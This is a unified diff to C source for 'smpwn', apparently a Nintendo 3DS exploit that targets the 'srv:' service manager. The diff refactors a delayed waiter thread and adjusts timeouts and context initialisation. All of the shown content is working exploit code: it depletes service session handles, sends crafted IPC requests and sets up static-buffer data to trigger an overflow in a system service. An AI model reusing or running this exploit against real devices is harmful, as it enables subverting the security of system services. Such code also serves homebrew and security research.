@@ -125,10 +125,10 @@ static Result smWriteStaticBufferData(const SmpwnContext *ctx, const void *data,
     return svcSendSyncRequest(ctx->srvHandle);
 }
 
-static void smpwnDelayedWaiterThread(void *p)
+static void smpwnDelayedWaiterThreadTask(SmpwnContext *ctx)
 {
-    SmpwnContext *ctx = (SmpwnContext *)p;
     Handle h;
+
     svcConnectToPort(&h, "srv:"); // Get another session
     u32* cmdbuf = getThreadCommandBuffer();
 
@@ -137,7 +137,6 @@ static void smpwnDelayedWaiterThread(void *p)
     svcSendSyncRequest(h);
 
     for (;;) {
-        memset(cmdbuf, 0xFFFFFFFF, 0x100);
         cmdbuf[0] = IPC_MakeHeader(0x5,0x3F,0); // GetPort 0x50100 GetServiceHandle modified
         strncpy((char*) &cmdbuf[1], SMPWN_VICTIM_SERVICE_NAME,8);
         cmdbuf[3] = strnlen(SMPWN_VICTIM_SERVICE_NAME, 8);
@@ -146,9 +145,15 @@ static void smpwnDelayedWaiterThread(void *p)
         ctx->depletionArray[ctx->nbDepletionHandles++] = cmdbuf[3];
         svcSignalEvent(ctx->waiterThreadWokeUpEvent);
     }
+}
+
+static void smpwnDelayedWaiterThread(void *p)
+{
+    SmpwnContext *ctx = (SmpwnContext *)p;
+    smpwnDelayedWaiterThreadTask(ctx);
 
     // Due to the exploit this thread should never resume
-    __builtin_trap();
+    for (;;) svcSleepThread(100 * 1000 * 1000 * 1000LL);
 }
 
 Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
@@ -156,6 +161,7 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
     Result res = 0;
     u16 numRegistered;
 
+    memset(ctx, 0, sizeof(SmpwnContext));
     TRY(svcCreateEvent(&ctx->waiterThreadWokeUpEvent, RESET_ONESHOT));
     TRY(srvInit(&ctx->srvHandle));
     ctx->dummyStringBytes = 0xC0CCC00C;
@@ -192,7 +198,7 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
     // Make one session wait forever for a service session handle
     MyThread t;
     TRY(MyThread_Create(&t, smpwnDelayedWaiterThread, ctx, ctx->delayedWaiterThreadStack, SMPWN_THREAD_STACK_SIZE, 0x18, -2));
-    TRY(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, -1LL));
+    TRY_ALL(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, 25 * 1000 * 1000LL));
     svcSleepThread(10 * 1000 * 1000LL);
 
     // Set up the data at the static buffer 0 address (7.0+: 0x10ADFC)
@@ -215,7 +221,8 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
         Handle h = ctx->depletionArray[--ctx->nbDepletionHandles];
         ctx->depletionArray[ctx->nbDepletionHandles] = 0;
         svcCloseHandle(h);
-        TRY(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, 25 * 1000 * 1000LL)); // timeout value too low/too high => more unstable
+        // timeout value too low/too high => more unstable; don't return on timeout
+        TRY(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, 25 * 1000 * 1000LL));
 
         if (res == 0) {
             // It woke up = no overflow.
